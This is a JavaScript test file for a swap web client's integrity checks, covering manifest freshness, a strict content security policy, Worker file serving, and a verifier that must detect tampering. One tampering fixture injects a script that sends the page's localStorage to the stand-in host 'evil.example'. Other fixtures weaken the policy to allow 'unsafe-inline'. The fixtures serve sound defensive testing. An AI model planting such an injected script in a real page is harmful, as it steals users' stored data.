import {test} from 'node:test';
import assert from 'node:assert/strict';
import {spawn,spawnSync} from 'node:child_process';
import {createServer} from 'node:net';
import {mkdtemp,rm} from 'node:fs/promises';
import {readFileSync,existsSync,statSync} from 'node:fs';
import {tmpdir} from 'node:os';
import {join,resolve} from 'node:path';
import {once} from 'node:events';
import {build,servedFiles,REPO} from '../scripts/build_client_manifest.mjs';
import {verifyClient} from '../scripts/verify_hosted_client.mjs';
import worker from '../swap-service/cloudflare/worker.mjs';

const ui=join(REPO,'swap-ui');

test('generated integrity files are fresh and every served script parses',()=>{
 const {outputs,manifest}=build({repo:REPO});
 for(const [path,text] of Object.entries(outputs))assert.equal(readFileSync(join(REPO,path),'utf8'),text,path+' is stale; run node scripts/build_client_manifest.mjs');
 for(const path of Object.keys(manifest.files).filter(p=>/\.(mjs|js)$/.test(p))){
  const r=spawnSync(process.execPath,['--check',join(ui,path)],{encoding:'utf8'});
  assert.equal(r.status,0,path+': '+r.stderr.split('\n').slice(0,4).join(' '));
 }
 assert.ok(!Object.keys(manifest.files).some(p=>/\.test\.mjs$|^test-|fixtures\//.test(p)),'tests and fixtures are not served');
 assert.equal(manifest.files['chain-timing.json'].sha256,manifest.chain_timing_sha256);
});

test('the hosted page has no inline code except the hashed import map, and the policy is strict',()=>{
 const {manifest}=build({repo:REPO}),html=readFileSync(join(ui,'hosted.html'),'utf8');
 const inline=[...html.matchAll(/<script(?![^>]*\ssrc=)([^>]*)>/g)];
 assert.equal(inline.length,1);assert.match(inline[0][1],/importmap/);
 assert.doesNotMatch(html,/\son[a-z]+\s*=|\sstyle\s*=|<style/i);
 for(const [name,csp] of Object.entries(manifest.csp)){
  for(const needle of ["default-src 'self'","object-src 'none'","frame-ancestors 'none'","base-uri 'none'","form-action 'self'",manifest.import_map.source])assert.ok(csp.includes(needle),name+' policy lacks '+needle);
  assert.doesNotMatch(csp,/unsafe-|\*/);
 }
 assert.match(html,/<link rel="stylesheet" href="\/style\.css" integrity="sha256-[A-Za-z0-9+/=]+"/);
 assert.match(html,/<script type="module" src="\/app\.js" integrity="sha256-[A-Za-z0-9+/=]+"/);
 const map=JSON.parse(/<script type="importmap">([\s\S]*?)<\/script>/.exec(html)[1]);
 for(const [path,info] of Object.entries(manifest.files).filter(([p])=>/\.(mjs|js)$/.test(p)))assert.equal(map.integrity['/'+path],'sha256-'+Buffer.from(info.sha256,'hex').toString('base64'));
});

// A deployed Worker over the real swap-ui files, with optional tampering at the network edge.
function deployed(tamper=()=>null){
 const assets={fetch:async request=>{
  const path=new URL(request.url).pathname.slice(1),file=join(ui,path);
  if(!path||!existsSync(file)||!statSync(file).isFile())return new Response('missing',{status:404});
  return new Response(readFileSync(file),{headers:{'content-type':'application/octet-stream'}});
 }};
 return async path=>{
  const forged=tamper(path);if(forged)return forged;
  const r=await worker.fetch(new Request('https://swap.example'+path),{ASSETS:assets});
  return {status:r.status,headers:Object.fromEntries(r.headers),bytes:Buffer.from(await r.arrayBuffer())};
 };
}
const failed=report=>report.checks.filter(c=>!c.ok).map(c=>c.name);
const response=(bytes,from)=>({status:200,headers:from.headers,bytes:Buffer.from(bytes)});

test('verifier accepts the Worker as built and reports every kind of tampering',async()=>{
 const clean=await verifyClient({fetcher:deployed(),profile:'hosted'});
 assert.deepEqual(failed(clean),[]);assert.ok(clean.ok);assert.ok(clean.checks.length>100);
 const base=deployed();
 const cases={
  'a served module is modified':[path=>path==='/pair-check.mjs'?'pair':null,async()=>{const r=await base('/pair-check.mjs');return response(Buffer.concat([r.bytes,Buffer.from('\n//x')]),r);},'served file: /pair-check.mjs'],
  'the page root is modified':[path=>path==='/'?'root':null,async()=>{const r=await base('/');return response(r.bytes.toString().replace('</body>','<script>fetch("//evil.example/"+localStorage)</script></body>'),r);},'served root: / is hosted.html'],
  'the timing file differs from the repository':[path=>path==='/chain-timing.json'?'timing':null,async()=>{const r=await base('/chain-timing.json');return response(r.bytes.toString().replace(/\d+/,m=>String(Number(m)+1)),r);},'timing: /chain-timing.json equals config/swap/chain-timing.json'],
  'a served file is missing':[path=>path==='/identity.mjs'?'gone':null,async()=>({status:404,headers:{},bytes:Buffer.alloc(0)}),'served file: /identity.mjs'],
  'the content security policy is weakened':[path=>path==='/'?'csp':null,async()=>{const r=await base('/');return {...r,headers:{...r.headers,'content-security-policy':"default-src *; script-src * 'unsafe-inline'"}};},'header: content-security-policy on /'],
  'the content security policy is removed':[path=>path==='/app.js'?'csp':null,async()=>{const r=await base('/app.js');const headers={...r.headers};delete headers['content-security-policy'];return {...r,headers};},'header: content-security-policy on /app.js'],
  'a test file is served':[path=>path==='/identity.test.mjs'?'test':null,async()=>({status:200,headers:{},bytes:Buffer.from('x')}),'not served: /identity.test.mjs'],
  'the relay source is served':[path=>path==='/server.ts'?'src':null,async()=>({status:200,headers:{},bytes:Buffer.from('x')}),'not served: /server.ts']
 };
 for(const [label,[match,make,expected]] of Object.entries(cases)){
  const fetcher=async path=>match(path)?await make():await base(path);
  const report=await verifyClient({fetcher,profile:'hosted'});
  assert.equal(report.ok,false,label+' must fail');
  assert.ok(failed(report).includes(expected),label+' must fail "'+expected+'" but failed: '+failed(report).join('; '));
 }
});

test('verifier flags a page that references something outside the manifest',async()=>{
 const base=deployed();
 const fetcher=async path=>{
  const r=await base(path);
  if(path==='/app.js')return response(Buffer.concat([r.bytes,Buffer.from("\nimport('/extra-module.mjs');\n")]),r);
  return r;
 };
 const report=await verifyClient({fetcher,profile:'hosted'});
 assert.ok(failed(report).includes('references: nothing outside the manifest, no external origins'));
 assert.ok(failed(report).includes('served file: /app.js'));
});

test('the Worker serves only manifest files and a fixed policy',async()=>{
 const fetcher=deployed();
 const root=await fetcher('/');assert.equal(root.status,200);
 const {manifest}=build({repo:REPO});
 assert.equal(root.headers['content-security-policy'],manifest.csp.hosted);
 assert.equal(root.headers['x-content-type-options'],'nosniff');
 assert.equal((await fetcher('/index.html')).bytes.toString(),root.bytes.toString());
 assert.match(root.bytes.toString(),/data-hosted-testnet/);
 for(const path of ['/server.ts','/identity.test.mjs','/test-wallets.mjs','/fixtures/cardano-preview-params.json','/.assetsignore','/../server.ts','/vendor-src/package.json'])assert.notEqual((await fetcher(path)).status,200,path);
 assert.deepEqual(servedFiles(ui).includes('index.html'),true);
});

async function freePort(){const s=createServer();s.listen(0,'127.0.0.1');await once(s,'listening');const n=s.address().port;await new Promise(r=>s.close(r));return n;}

test('verifier accepts the local relay as a verified checkout serves it',async()=>{
 const dir=await mkdtemp(join(tmpdir(),'swap-verify-local-')),port=await freePort(),base='http://127.0.0.1:'+port;
 const server=spawn(process.execPath,[resolve(REPO,'swap-service/server.ts')],{env:{...process.env,SWAP_DB:join(dir,'offers.db'),SWAP_PORT:String(port)},stdio:'ignore'});
 try{
  for(let i=0;i<100;i++){try{if((await fetch(base+'/health')).ok)break;}catch{}await new Promise(r=>setTimeout(r,50));}
  const fetcher=async path=>{const r=await fetch(base+path,{redirect:'manual'});return {status:r.status,headers:Object.fromEntries(r.headers),bytes:Buffer.from(await r.arrayBuffer())};};
  const report=await verifyClient({fetcher,profile:'local'});
  assert.deepEqual(failed(report),[]);
  // The hosted profile must not accept the local page: its policy and root differ.
  const wrong=await verifyClient({fetcher,profile:'hosted'});assert.equal(wrong.ok,false);
 }finally{
  if(server.exitCode===null){server.kill('SIGTERM');await once(server,'exit');}
  await rm(dir,{recursive:true,force:true});
 }
});
